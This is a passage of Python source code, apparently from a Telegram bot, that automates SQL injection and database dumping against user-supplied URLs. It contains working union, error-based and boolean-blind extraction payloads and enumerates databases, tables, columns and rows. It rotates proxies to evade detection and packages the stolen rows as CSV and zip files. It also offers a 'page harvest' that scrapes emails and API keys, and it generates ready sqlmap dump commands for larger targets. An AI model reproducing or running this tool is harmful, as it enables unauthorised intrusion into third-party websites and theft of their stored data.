                           timeout: float, rot=None, budget=None) -> str:
    if not sql or not cols or not pos:
        return ""
    expr = ["1"] * cols
    expr[pos - 1] = _sqli_wrap(det.get("dbms") or "MySQL", sql)
    payload = "%s UNION SELECT %s %s" % (det["quote"], ", ".join(expr),
                                         det["comment"])
    r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
                        timeout, rot, budget)
    body = _html.unescape(_sqli_body(r))
    m = re.search(re.escape(SQLI_MARK) + r"(.*?)" + re.escape(SQLI_MARK), body, re.S)
    if not m:
        return ""
    return _sqli_flat(m.group(1))[:6000]


def _sqli_error_payload(det: dict, sql: str) -> str:
    q, c = det["quote"], det["comment"]
    inner = ("(SELECT 1 FROM(SELECT COUNT(*),CONCAT((%s),FLOOR(RAND(0)*2))x "
             "FROM information_schema.tables GROUP BY x)a)" % sql)
    return q + " AND " + inner + " " + c


async def _sqli_error_text(session, det: dict, sql: str, timeout: float,
                           rot=None, budget=None) -> str:
    if not sql:
        return ""
    r = await _sqli_req(session, _sqli_url(det["raw"], det["param"],
                                           _sqli_error_payload(det, sql)),
                        timeout, rot, budget)
    body = _html.unescape(_sqli_body(r))
    m = re.search(r"Duplicate entry '(.+?)' for key", body, re.I | re.S)
    if not m:
        return ""
    val = re.sub(r"\d{1,2}$", "", m.group(1))       # RAND() ka last digit hatao
    return _sqli_flat(val)[:6000]


def _sqli_row_sql(det: dict, table: str, cols: list, offset: int) -> str:
    return sqli_sql(det.get("dbms") or "MySQL", "row", table=table, cols=cols,
                    offset=offset)


async def _sqli_blind_text(session, det: dict, sql: str, maxlen: int, timeout: float,
                           rot=None, budget=None) -> str:
    """Binary search — ek request me ek character ka poora range."""
    out = ""
    dbms = det.get("dbms") or "MySQL"
    ordn, subn = _sqli_ord(dbms), _sqli_sub(dbms)
    true_body, false_body = _sqli_body(det.get("true")), _sqli_body(det.get("false"))

    async def cond(expr: str) -> bool:
        payload = "%s AND (%s) %s" % (det["quote"], expr, det["comment"])
        r = await _sqli_req(session, _sqli_url(det["raw"], det["param"], payload),
                            timeout, rot, budget)
        if not r.get("status") or r.get("status") >= 500:
            return False
        if dbms_fingerprint(_sqli_body(r)):
            return False
        d_t = _sqli_diff(_sqli_body(r), true_body) if true_body else 10 ** 6
        d_f = _sqli_diff(_sqli_body(r), false_body) if false_body else 0
        return d_t <= d_f

    for p in range(1, maxlen + 1):
        if budget is not None and budget.get("left", 0) <= 0:
            out += "…"
            break
        if not await cond("%s(%s((%s),%d,1))>0" % (ordn, subn, sql, p)):
            break
        lo, hi = 31, 127
        while lo < hi:
            if budget is not None and budget.get("left", 0) <= 0:
                return out + "…"
            mid = (lo + hi) // 2
            if await cond("%s(%s((%s),%d,1))>%d" % (ordn, subn, sql, p, mid)):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
    return out


async def _sqli_text(session, det: dict, sql: str, cols: int, pos: int, caps: dict,
                     timeout: float, rot=None, budget=None, blind_len: int = 0) -> str:
    """Value nikalo — union, phir error-based, phir blind."""
    if not sql:
        return ""
    if pos and cols:
        v = await _sqli_union_text(session, det, cols, pos, sql, timeout, rot, budget)
        if v:
            return v
    if (det.get("dbms") or "") in ("MySQL", ""):
        v = await _sqli_error_text(session, det, sql, timeout, rot, budget)
        if v:
            return v
    if caps.get("blind", 1):
        ln = blind_len or int(caps.get("blind_len", 22))
        return await _sqli_blind_text(session, det, sql, ln, timeout, rot, budget)
    return ""


async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
                        timeout: float = 8.0, rot=None, on_stage=None) -> dict:
    """Ek URL ka dump: param dhoondo → db → tables → columns → rows."""
    caps = caps or {}
    t0 = time.time()
    res = {"url": raw, "param": param, "ok": False, "status": "", "dbms": "", "tech": "",
           "quote": "", "comment": "", "db": "", "dbs": [], "tables": {},
           "notes": [], "rows": 0, "requests": 0, "took": 0, "why": "",
           "large": False, "large_reason": "", "poc": "", "tables_total": 0}
    budget = {"left": int(caps.get("requests", 500)), "used": 0}
    max_tables = int(caps.get("tables", 8))
    max_rows = int(caps.get("rows", 8))

    params = [param] if param else []
    if not params:
        try:
            params = (url_reverse(raw).get("params") or [])[:4]
        except Exception:
            params = []
    if not params:
        res.update(status="no parameter in URL",
                   why="URL has no query parameter")
        return res

    det = {}
    for pn in params:
        if budget["left"] <= 12:
            break
        if on_stage:
            await on_stage("detect", "%s (%s)" % (urlparse(raw).path[-26:] or "/", pn))
        det = await sqli_detect(session, raw, pn, timeout, rot, budget)
        if det.get("ok"):
            res["param"] = pn
            break
    if not det.get("ok"):
        _why = det.get("why") or "no injection point"
        if param:
            _why = ("injector ne confirm kiya tha, par dump ke waqt output nahi mila "
                    "(WAF / blind) → %s" % _why)
        res.update(status="not injectable", why=_why,
                   requests=budget["used"], took=time.time() - t0)
        return res

    dbms = det.get("dbms") or "MySQL"
    if det.get("dbms_guess") or not dbms:
        for cand, probe in (("SQLite", "SELECT sqlite_version()"),
                            ("MySQL", "SELECT version()"),
                            ("PostgreSQL", "SELECT version()")):
            det["dbms"] = cand
            got = await _sqli_text(session, det, probe, 0, 0, caps, timeout, rot, budget, 12)
            if got and any(ch.isdigit() for ch in got):
                dbms = cand
                break
        det["dbms"] = dbms
    res.update(ok=True, status="injectable", dbms=dbms, tech=det.get("tech") or "",
               quote=det.get("quote") or "", comment=det.get("comment") or "")
    if det.get("tech") == "time":
        res.update(status="time-based blind", tech="time-based",
                   notes=["time-based injection confirmed — data extraction skipped "
                          "(too slow on a phone)"], requests=budget["used"],
                   took=time.time() - t0)
        return res

    if on_stage:
        await on_stage("columns", "counting columns")
    cols = await _sqli_cols(session, det, timeout, rot, budget)
    pos = await _sqli_union_pos(session, det, cols, timeout, rot, budget) if cols else 0
    if pos:
        res["tech"] = "%s + UNION (column %d printed)" % (det.get("tech"), pos)
    else:
        res["tech"] = "%s (blind extraction)" % det.get("tech")
        res["notes"].append("page does not print query output — extracted with "
                            "boolean-blind requests")

    async def value(sql: str, blen: int = 0):
        return await _sqli_text(session, det, sql, cols, pos, caps, timeout, rot,
                                budget, blen)

    if on_stage:
        await on_stage("database", "current database")
    res["db"] = (await value(sqli_sql(dbms, "current_db"), 40)).strip()[:60]
    if on_stage:
        await on_stage("databases", "listing databases")
    if pos:
        res["dbs"] = _sqli_split(await value(sqli_sql(dbms, "dbs"), 300))[:40]
    elif res["db"]:
        res["dbs"] = [res["db"]]

    if on_stage:
        await on_stage("tables", "listing tables")
    all_tbls = [t for t in _sqli_split(
        await value(sqli_sql(dbms, "tables"),
                    800 if pos else int(caps.get("blind_tables_len", 60))))
        if t and not t.startswith("sqlite_")]
    res["tables_total"] = len(all_tbls)
    tbls = all_tbls[:max_tables]
    if len(all_tbls) > max_tables:
        res["large"] = True
        res["large_reason"] = res["large_reason"] or (
            "%d tables found (inline cap %d)" % (len(all_tbls), max_tables))
    if not tbls:
        res["notes"].append("table list empty (no rights / WAF / no output)")

    for tbl in tbls:
        if budget["left"] <= 4:
            res["notes"].append("request budget finished — remaining tables skipped")
            break
        if on_stage:
            await on_stage("columns", tbl)
        colnames = _sqli_split(await value(sqli_sql(dbms, "columns", table=tbl),
                                           600 if pos else int(caps.get("blind_cols_len", 80))))[:40]
        entry = {"cols": colnames, "rows": [], "truncated": False, "total_rows": None,
                 "skipped": False}
        res["tables"][tbl] = entry
        if not colnames:
            res["notes"].append("%s: columns not readable" % tbl)
            continue
        # kitni rows hain? (sirf tab jab page output deta ho — 1 request)
        if pos and cols and budget["left"] > 6:
            cnt_txt = await value(sqli_sql(dbms, "count", table=tbl), 20)
            mcnt = re.search(r"\d+", str(cnt_txt or ""))
            if mcnt:
                entry["total_rows"] = int(mcnt.group(0))
                if entry["total_rows"] > max_rows:
                    entry["skipped"] = True
                    res["large"] = True
                    res["large_reason"] = res["large_reason"] or (
                        "%s has %s rows (inline cap %d)"
                        % (tbl, fmt(entry["total_rows"]), max_rows))
                    res["notes"].append(
                        "%s: %s rows — row dump skipped (data too large for inline dump)"
                        % (tbl, fmt(entry["total_rows"])))
                    continue
        limit = max_rows if pos else int(caps.get("blind_rows", 0) or 0)
        for k in range(limit):
            if budget["left"] <= 4:
                entry["truncated"] = True
                break
            if on_stage:
                await on_stage("rows", "%s (%d)" % (tbl, k + 1))
            row = await value(_sqli_row_sql(det, tbl, colnames, k), 260)
            if not row or SQLI_MARK in row:
                break
            vals = [x.strip() for x in row.split("||")]
            if not any(vals):
                break
            entry["rows"].append(vals)
            res["rows"] += 1
        if pos and len(entry["rows"]) >= max_rows:
            entry["truncated"] = True
            res["large"] = True
            res["large_reason"] = res["large_reason"] or (
                "%s hit the row cap (%d)" % (tbl, max_rows))
    if budget["left"] <= 0:
        res["large"] = True
        res["large_reason"] = res["large_reason"] or "request budget finished before the end"
    if res["large"]:
        res["poc"] = raw          # saaf URL — sqlmap khud param test karega
        res["notes"].append(
            "LARGE DATA: this URL holds more data than the inline cap — "
            "use a dedicated dumper (sqlmap) on the VPS with this URL")
    res["requests"] = budget["used"]
    res["took"] = time.time() - t0
    return res


def sqli_report_text(res: dict) -> list:
    """Plain-text report — copy-paste safe."""
    L_ = ["=" * 64,
          "URL    : " + str(res.get("url") or ""),
          "PARAM  : %s    STATUS: %s" % (res.get("param") or "-", res.get("status") or ""),
          "DBMS   : %s    TECHNIQUE: %s" % (res.get("dbms") or "-", res.get("tech") or "-"),
          "DB     : " + (res.get("db") or "-"),
          "QUES   : quote=%r comment=%r" % (res.get("quote") or "", res.get("comment") or ""),
          "REQ    : %s    TIME: %.1fs" % (res.get("requests", 0), res.get("took", 0))]
    if res.get("why"):
        L_.append("NOTE   : " + str(res["why"]))
    if res.get("large"):
        L_.append("-" * 64)
        L_.append("!! LARGE DATA FOUND — %s" % (res.get("large_reason") or "above inline caps"))
        L_.append("!! Inline dump is only a preview. Full dump needs a powerful tool.")
        L_.append("!! Target URL : " + str(res.get("poc") or res.get("url")))
        L_.append('!! Ready command (VPS): sqlmap -u "%s" -p %s --batch --dump --threads 4'
                  % (res.get("poc") or res.get("url"), res.get("param") or "id"))
    if res.get("dbs"):
        L_.append("-" * 64)
        L_.append("DATABASES (%d): %s" % (len(res["dbs"]), ", ".join(res["dbs"][:40])))
    for tname, entry in (res.get("tables") or {}).items():
        L_.append("-" * 64)
        L_.append("TABLE %s   COLUMNS (%d): %s" % (
            tname, len(entry.get("cols") or []),
            ", ".join(entry.get("cols") or []) or "-"))
        for row in entry.get("rows") or []:
            L_.append("  " + " | ".join(str(x)[:80] for x in row))
        if entry.get("truncated"):
            L_.append("  ... limit reached (use /batch dumprows to raise)")
        if entry.get("skipped"):
            L_.append("  (skipped — %s rows, too large for inline dump)"
                      % fmt(entry.get("total_rows") or 0))
        elif not entry.get("rows"):
            L_.append("  (no rows extracted)")
    if res.get("notes"):
        L_.append("-" * 64)
        for n in res["notes"]:
            L_.append("* " + str(n))
    L_.append("=" * 64)
    return L_


async def sqli_dump(urls: list, targets=None, caps=None, timeout: float = 8.0,
                    conc: int = 3, progress=None, uid=None) -> dict:
    """Saare URLs ka dump — live progress ke saath."""
    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
    caps = caps or {}
    st = {"urls": len(urls), "done": 0, "results": [], "rows": 0, "tables": 0,
          "injectable": 0, "start": time.time(), "stage": "start", "stage_info": "",
          "stopped": 0}
    rot = ProxyRotator(enabled=proxy_available())
    sem = asyncio.Semaphore(max(1, min(8, conc)))
    lock = asyncio.Lock()
    conn = mk_connector(limit=max(4, conc + 2), force_close=True)

    async def one(session, raw, param):
        if uid and stop_requested(uid):
            return
        report = {"last": 0.0}

        async def stage(name, info):
            st["stage"], st["stage_info"] = name, str(info)[:44]
            if progress and time.time() - report["last"] > 2.0:
                report["last"] = time.time()
                try:
                    await progress(st)
                except Exception:
                    pass

        async with sem:
            if uid and stop_requested(uid):
                return
            try:
                res = await sqli_dump_one(session, raw, param or "", caps, timeout, rot,
                                          stage)
            except Exception as exc:
                res = {"url": raw, "status": "error", "why": str(exc)[:90], "tables": {},
                       "dbs": [], "rows": 0, "took": 0, "requests": 0, "ok": False,
                       "notes": []}
            async with lock:
                st["done"] += 1
                st["results"].append(res)
                st["rows"] += res.get("rows", 0)
                st["tables"] += len(res.get("tables") or {})
                if res.get("ok"):
                    st["injectable"] += 1
                if progress:
                    try:
                        await progress(st)
                    except Exception:
                        pass

    async with aiohttp.ClientSession(connector=conn) as session:
        await asyncio.gather(*[one(session, u, (targets or {}).get(u, "")) for u in urls])
    if uid and stop_requested(uid):
        st["stopped"] = 1
    st["took"] = time.time() - st["start"]
    return st


def sqli_save(st: dict) -> dict:
    """Har URL ka report + all_rows.csv + poora zip."""
    stamp_ = stamp()
    files, rows_csv = [], []
    zpath = os.path.join(DUMP_DIR, "sqldump_%s.zip" % stamp_)
    csv_path = os.path.join(DUMP_DIR, "sqldump_rows_%s.csv" % stamp_)
    try:
        for i, res in enumerate(st.get("results") or [], 1):
            host = re.sub(r"[^A-Za-z0-9.\-]", "_",
                          urlparse(res.get("url") or "").netloc or "site")
            fp = os.path.join(DUMP_DIR, "sqldump_%s_%02d_%s.txt" % (stamp_, i, host[:36]))
            with open(fp, "w", encoding="utf-8") as f:
                f.write("\n".join(sqli_report_text(res)) + "\n")
            files.append(fp)
            for tname, entry in (res.get("tables") or {}).items():
                for row in entry.get("rows") or []:
                    rows_csv.append([res.get("url", ""), res.get("db", ""), tname,
                                     "|".join(str(x) for x in row)])
        with open(csv_path, "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f)
            w.writerow(["url", "database", "table", "row"])
            for r in rows_csv:
                w.writerow(r)
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as zf:
            for fp in files:
                zf.write(fp, arcname=os.path.basename(fp))
            if rows_csv:
                zf.write(csv_path, arcname="all_rows.csv")
    except Exception as exc:
        logger.warning("sqli_save fail: %s", exc)
    return {"files": files, "zip": zpath if os.path.exists(zpath) else "",
            "csv": csv_path if os.path.exists(csv_path) else "", "rows": len(rows_csv)}


async def dump_harvest(urls: list, progress=None, uid=None, timeout: float = 10.0,
                       conc: int = 12) -> dict:
    """Har URL fetch karo aur data nikaalo — asli network, rot proxy priority."""
    urls = _uniq([u for u in (urls or []) if str(u).startswith("http")])
    st = {"urls": len(urls), "done": 0, "records": [], "errors": 0,
          "start": time.time(), "stopped": 0}
    rot = ProxyRotator(enabled=proxy_available())
    sem = asyncio.Semaphore(max(2, min(40, conc)))
    lock = asyncio.Lock()
    conn = mk_connector(limit=max(6, conc), force_close=True)
    hdrs = {"User-Agent": random.choice(UA_LIST), "Accept": "*/*"}

    async def one(session, u):
        if uid and stop_requested(uid):
            return
        async with sem:
            if uid and stop_requested(uid):
                return
            kw = {"headers": dict(hdrs), "timeout": aiohttp.ClientTimeout(total=timeout),
                  "ssl": False, "allow_redirects": True, "max_redirects": 5}
            px = rot.next()
            if px:
                pxc, _h2, _i2, _s2 = await proxy_connect_url(px)
                kw["proxy"] = pxc
            try:
                async with session.get(u, **kw) as r:
                    body = await r.text(errors="ignore")
                    rec = dump_extract(str(r.url), r.status, dict(r.headers), body)
                    rec["input"] = u
            except Exception as exc:
                rec = {"input": u, "url": u, "error": str(exc)[:80]}
            async with lock:
                st["done"] += 1
                if rec.get("error"):
                    st["errors"] += 1
                else:
                    st["records"].append(rec)

    async with aiohttp.ClientSession(connector=conn) as session:
        await asyncio.gather(*[one(session, u) for u in urls])
        if uid and stop_requested(uid):
            st["stopped"] = 1
        if progress:
            try:
                await progress(st)
            except Exception:
                pass
    # per-URL txt + zip
    stamp_ = stamp()
    made, zpath = [], os.path.join(DUMP_DIR, "dump_pack_%s.zip" % stamp_)
    summary_csv = os.path.join(DUMP_DIR, "dump_summary_%s.csv" % stamp_)
    try:
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as zf:
            for i, rec in enumerate(st["records"], 1):
                txt = dump_record_text(rec)
                host = re.sub(r"[^A-Za-z0-9.\-]", "_", urlparse(rec["url"]).netloc or "site")
                name = "%02d_%s.txt" % (i, host[:40])
                fp = os.path.join(DUMP_DIR, "dump_" + stamp_ + "_" + name)
                with open(fp, "w", encoding="utf-8") as f:
                    f.write("\n".join(txt) + "\n")
                zf.write(fp, arcname=name)
                made.append(fp)
            with open(summary_csv, "w", encoding="utf-8") as f:
                f.write("url,status,server,title,forms,params,endpoints,js,emails,"
                        "comments,tables,secrets,bytes\n")
                for rec in st["records"]:
                    f.write('"%s",%s,"%s","%s",%d,%d,%d,%d,%d,%d,%d,%d,%d\n' % (
                        rec["url"].replace('"', "%22"), rec["status"],
                        str(rec["server"]).replace('"', "'")[:40],
                        str(rec["title"]).replace('"', "'")[:70], len(rec["forms"]),
                        len(rec["params"]), len(rec["endpoints"]), len(rec["js"]),
                        len(rec["emails"]), len(rec["comments"]), len(rec["tables"]),
                        len(rec["secrets"]), rec["bytes"]))
            zf.write(summary_csv, arcname="summary.csv")
            js = dump_json({"count": len(st["records"]),
                            "records": [dict({k: r.get(k) for k in
                                      ("url", "status", "server", "title", "bytes")},
                                     params=r.get("params", [])[:50],
                                     endpoints=r.get("endpoints", [])[:60],
                                     emails=r.get("emails", [])[:30])
                                for r in st["records"]]},
                           "dump_json_" + stamp_)
            zf.write(js, arcname="summary.json")
    except Exception as exc:
        logger.warning("dump pack zip fail: %s", exc)
    st["files"] = made
    st["zip"] = zpath if os.path.exists(zpath) else ""
    st["csv"] = summary_csv if os.path.exists(summary_csv) else ""
    st["took"] = time.time() - st["start"]
    return st


async def tool_dump(update, context):
    """DUMPER — URLs do, andar ka SQL data nikaalo (full dump)."""
    q = update.callback_query
    files = dumps_list(4)
    last = len(context.user_data.get("last_urls") or [])
    vuln_last = len(context.user_data.get("last_vulns") or [])
    caps = _sqli_caps()
    rows = [[InlineKeyboardButton("📥 SEND URLS — FULL SQL DUMP", callback_data="df:go")]]
    if vuln_last:
        rows.append([InlineKeyboardButton("💉 LAST VULNERABLE URLS (%d)" % vuln_last,
                                          callback_data="df:vuln")])
    if last:
        rows.append([InlineKeyboardButton("📥 LAST PARSER URLS (%d)" % last,
                                          callback_data="df:last")])
    rows.append([InlineKeyboardButton("🕸 PAGE HARVEST (forms/links/secrets)",
                                      callback_data="df:harv")])
    if files:
        rows.append([InlineKeyboardButton("📄 Old files (%d)" % len(files),
                                          callback_data="df:old")])
        rows.append([InlineKeyboardButton("📦 ALL ZIP", callback_data="df:zip")])
    rows.append([InlineKeyboardButton("📤 FULL EXPORT (kw/dork/urls)",
                                      callback_data="df:full")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    txt = (H("DUMPER", "full SQL data dump", slot="dump") + "\n\n"
           + B("Send vulnerable URLs") + "\n"
           + P("paste URLs in the chat or send a .txt file — every URL is verified "
               "first, then its data is extracted.") + "\n\n"
           + KV("Method", "detect → columns → databases → tables → columns → rows", "🧩") + "\n"
           + KV("Tables / URL", "<code>%s</code>" % fmt(caps["tables"]), "🗃") + "\n"
           + KV("Rows / table", "<code>%s</code>" % fmt(caps["rows"]), "📄") + "\n"
           + KV("Blind mode", "on (if page prints nothing)", "🙈") + "\n"
           + KV("Request cap", "<code>%s</code> per URL" % fmt(caps["requests"]), "🔋") + "\n\n"
           + B("You get") + "\n"
           + P("one report per URL (DB, tables, columns, rows) + all_rows.csv + zip.")
           + "\n\n<code>https://target.com/product.php?id=5</code>")
    try:
        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_dump_go(update, context):
    q = update.callback_query
    caps = _sqli_caps()
    rows = [[InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")]]
    txt = (H("SEND URLS TO DUMP", "step 1 — URLs") + "\n\n"
           + B("Paste") + "\n" + P("one URL per line") + "\n"
           + "<code>https://target.com/item.php?id=12</code>\n\n"
           + B("File") + "\n" + P(".txt / .csv / .json / .xlsx — all URLs at once")
           + "\n\n"
           + KV("Tables / URL", "<code>%s</code>" % fmt(caps["tables"]), "🗃") + "\n"
           + KV("Rows / table", "<code>%s</code>" % fmt(caps["rows"]), "📄") + "\n"
           + KV("Timeout", "<code>%ss</code>" % int(sget("dump_timeout", 8) or 8), "⏱")
           + "\n" + KV("Parallel", "<code>%d</code> URLs" % int(sget("dump_conc", 3) or 3), "⚡")
           + "\n\n" + P("Only injectable URLs give data — the rest are reported with the "
                        "exact reason."))
    try:
        await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await_set(context, "dump_urls")


async def cb_dump_harv(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(
            (H("PAGE HARVEST", "step 1 — URLs") + "\n\n"
             + P("Send URLs one per line, or a .txt / .csv file. Every page is fetched and "
                 "the forms, links, JS files, emails, comments, table names and API keys "
                 "inside it are saved per URL.") + "\n\n"
             + "<code>https://target.com/product.php?id=5</code>"),
            parse_mode=ParseMode.HTML,
            reply_markup=RK([[InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")]]))
    except Exception:
        pass
    await_set(context, "harvest_urls")


async def cb_dump_full(update, context):
    """Full export — last keywords/dorks/urls, koi row cap nahi (txt + csv + json)."""
    q = update.callback_query
    sets = {
        "keywords": ("kw", context.user_data.get("last_kw_items") or []),
        "dorks": ("dork", context.user_data.get("last_dorks") or []),
        "urls": ("url", context.user_data.get("last_urls") or []),
    }
    got = [(k, d, items) for k, (d, items) in sets.items() if items]
    if not got:
        try:
            await q.answer("Generate something first (keywords/dorks/urls)", show_alert=True)
        except Exception:
            pass
        return
    lines = []
    for k, _d, items in got:
        path, cnt = dump_text(items, "full_" + k, "PYTHON SNAKE — full %s" % k)
        await send_file(update, path, "📤 %s — %s lines (no cap)" % (k.upper(), fmt(cnt)))
        js = dump_json({"type": k, "count": cnt, "items": items}, "full_" + k)
        await send_file(update, js, "🗂 %s json — %s" % (k.upper(), fmt(cnt)))
        lines.append(KV(k.upper(), "<code>%s</code>" % fmt(cnt), "📦"))
    if got:
        csv_path = os.path.join(DUMP_DIR, "full_all_%s.csv" % stamp())
        with open(csv_path, "w", encoding="utf-8") as f:
            f.write("type,value\n")
            for k, _d, items in got:
                for it in items:
                    f.write('%s,"%s"\n' % (k, str(it).replace('"', '""')))
        await send_file(update, csv_path, "📊 ALL — csv (no cap)")
    try:
        await q.edit_message_text(
            (H("FULL EXPORT", "no row caps") + "\n\n" + "\n".join(lines) + "\n\n"
             + P("Every set went out as txt + json, plus one combined csv. No row was skipped.")),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:dump"))
    except Exception:
        pass


async def cb_dump_file(update, context):
    q = update.callback_query
    arg = q.data.split(":", 1)[1]
    files = dumps_list(12)
    if arg in ("go", "old", "last", "vuln"):
        return await cb_dump_go(update, context)
    if arg == "full":
        return await cb_dump_full(update, context)

    if arg == "zip":
        name = os.path.join(DUMP_DIR, "all_dumps_%s.zip" % stamp())
        try:
            with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in dumps_list(60):
                    zf.write(f, arcname=os.path.basename(f))
        except Exception as exc:
            try:
                await q.answer("ZIP fail: %s" % exc, show_alert=True)
            except Exception:
                pass
            return
        await send_file(update, name, "📦 all dump files")
        return
    try:
        idx = int(arg)
        await send_file(update, files[idx], "📄 " + os.path.basename(files[idx]))
    except Exception:
        try:
            await q.answer("File not found", show_alert=True)
        except Exception:
            pass


async def cb_dump_old(update, context):
    q = update.callback_query
    files = dumps_list(12)
    if not files:
        try:
            await q.answer("No files yet", show_alert=True)
        except Exception:
            pass
        return
    rows = [[InlineKeyboardButton("📄 %s (%.0f KB)" % (os.path.basename(f)[:26],
                                                      os.path.getsize(f) / 1024),
                                  callback_data="df:%d" % i)]
            for i, f in enumerate(files)]
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:dump")])
    try:
        await q.edit_message_text(H("OLD DUMP FILES", "%d saved" % len(files)),
                                  reply_markup=RK(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_dump_use(update, context, which: str):
    """df:last / df:vuln — saved URLs se seedha full dump."""
    targets = {}
    if which == "vuln":
        vulns = context.user_data.get("last_vulns") or []
        urls = _uniq([v.get("base") or v.get("url") for v in vulns])
        for v in vulns:
            base = v.get("base") or v.get("url")
            if base and v.get("param"):
                targets[base] = v["param"]
    else:
        urls = context.user_data.get("last_urls") or []
    if not urls:
        try:
            await update.callback_query.answer("Nothing saved yet — run PARSER or SCANNER first",
                                              show_alert=True)
        except Exception:
            pass
        return
    await _run_sqldump(update, context, urls, targets)


def _sqli_caps() -> dict:
    return {"tables": int(sget("dump_tables", 8) or 8),
            "rows": int(sget("dump_rows", 8) or 8),
            "blind": int(sget("dump_blind", 1) or 0),
            "blind_len": int(sget("dump_blind_len", 24) or 24),
            "blind_rows": int(sget("dump_blind_rows", 0) or 0),
            "blind_tables": int(sget("dump_tables", 8) or 8),
            "requests": int(sget("dump_requests", 500) or 500)}


def _dump_progress_card(st: dict, spin: int) -> str:
    pct = (st["done"] / max(1, st["urls"])) * 100
    took = max(0.001, time.time() - st["start"])
    return (H("SQL DUMP", "live extraction") + "\n\n"
            + bar3(pct, 12, spin) + "\n\n"
            + "❖ URLs      : <code>%s/%s</code>\n" % (fmt(st["done"]), fmt(st["urls"]))
            + "❖ Injectable: <code>%s</code>\n" % fmt(st.get("injectable", 0))
            + "❖ Tables    : <code>%s</code>\n" % fmt(st.get("tables", 0))
            + "❖ Rows      : <code>%s</code>\n" % fmt(st.get("rows", 0))
            + "❖ Stage     : <b>%s</b> <i>%s</i>\n" % (esc(st.get("stage") or "-"),
                                                    esc(st.get("stage_info") or ""))
            + "❖ Elapsed   : <code>%.1fs</code>" % took)


def _dump_status_line(res: dict) -> str:
    host = urlparse(res.get("url") or "").netloc or res.get("url") or "-"
    if res.get("ok") and res.get("large"):
        return ("⚠️ <b>%s</b> — <b>LARGE DATA FOUND</b>\n"
                "   <i>%s · param <code>%s</code> · %d tables · preview %d rows</i>\n"
                "   <i>%s</i>\n   <code>%s</code>") % (
            esc(host[:44]), esc(res.get("dbms") or "-"), esc(res.get("param") or "-"),
            res.get("tables_total") or len(res.get("tables") or {}), res.get("rows", 0),
            esc(res.get("large_reason") or "more data than the inline cap")[:90],
            esc((res.get("poc") or res.get("url") or "")[:180]))
    if res.get("ok"):
        return "✅ <b>%s</b>\n   <i>%s · %s · param <code>%s</code> · %d tables · %d rows</i>" % (
            esc(host[:44]), esc(res.get("dbms") or "-"), esc(res.get("tech") or "-"),
            esc(res.get("param") or "-"), len(res.get("tables") or {}), res.get("rows", 0))
    return "⛔ <b>%s</b> — <i>%s</i>" % (
        esc(host[:44]), esc((res.get("why") or res.get("status") or "not injectable")[:80]))


async def _run_sqldump(update, context, urls, targets=None):
    """ASLI dump — URLs ke andar ka data nikaalo (db → tables → columns → rows)."""
    uid = str(update.effective_user.id)
    stop_clear(uid)
    tok = stop_mark(uid)
    urls = _uniq([u for u in urls if str(u).startswith("http")])
    caps = _sqli_caps()
    msg = await reply_msg(update).reply_text(
        _dump_progress_card({"urls": len(urls), "done": 0, "results": [], "rows": 0,
                             "tables": 0, "injectable": 0, "start": time.time(),
                             "stage": "starting", "stage_info": ""}, 0),
        parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
    spin = {"n": 0}

    async def prog(st):
        spin["n"] += 1
        try:
            await msg.edit_text(_dump_progress_card(st, spin["n"]),
                                parse_mode=ParseMode.HTML, reply_markup=kb_stop(uid, tok))
        except Exception:
            pass

    st = await sqli_dump(urls, targets=targets, caps=caps,
                         timeout=float(sget("dump_timeout", 8) or 8),
                         conc=int(sget("dump_conc", 3) or 3), progress=prog, uid=uid)
    saved = sqli_save(st)
    results = st["results"]
    okn = st["injectable"]
    large = [r for r in results if r.get("ok") and r.get("large")]
    # Injector vs Dumper ka farak saaf dikhao (5 vs 3 wali confusion khatam)
    _confirmed_n = len([u for u in urls if (targets or {}).get(u)]) if targets else 0
    _not_dumped = [r for r in results if not r.get("ok")] if targets else []
    head = ("🎯 <b>%d of %d URL(s) injectable</b>" % (okn, len(results))) if okn else \
        "🛡 <b>No injectable URL found</b>"
    card = (H("SQL DUMP COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
            + head + "\n"
            + "❖ Tables  : <code>%s</code>\n" % fmt(st["tables"])
            + "❖ Rows    : <code>%s</code>\n" % fmt(st["rows"])
            + "❖ Files   : <code>%s</code>\n" % fmt(len(saved["files"]))
            + ("⚠️ Large data: <code>%s</code> URL(s) — use a powerful tool\n" % fmt(len(large))
               if large else "")
            + (( "💉 Injector confirmed : <code>%d</code>\n" % _confirmed_n
                 + "✅ Dumped            : <code>%d</code>\n" % okn
                 + "⏭ Needs sqlmap      : <code>%d</code> (WAF / blind / no output)\n"
                   % len(_not_dumped))
               if targets else "")
            + ("⛔ Stopped early\n" if st.get("stopped") else "")
            + "\n" + bar3(100, 12, None) + "\n\n" + B("Results"))
    for res in results[:6]:
        card += "\n" + _dump_status_line(res) + "\n"
    if large:
        card += ("\n" + B("Large data — handover") + "\n"
                 + P("These URLs hold more than the inline cap. Dump them with a dedicated "
                     "tool on your VPS:") + "\n"
                 + "<code>sqlmap -u \"%s\" -p %s --batch --dump --threads 4</code>"
                 % (esc((large[0].get("poc") or large[0]["url"])[:150]),
                    esc(large[0].get("param") or "id")) + "\n")
    if len(results) > 6:
        card += "<i>+ %d more in the files…</i>\n" % (len(results) - 6)
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(card)[:3]:
        await reply_msg(update).reply_text(ch, parse_mode=ParseMode.HTML,
                                          reply_markup=kb_back("m:dump"))
    for f in saved["files"][:3]:
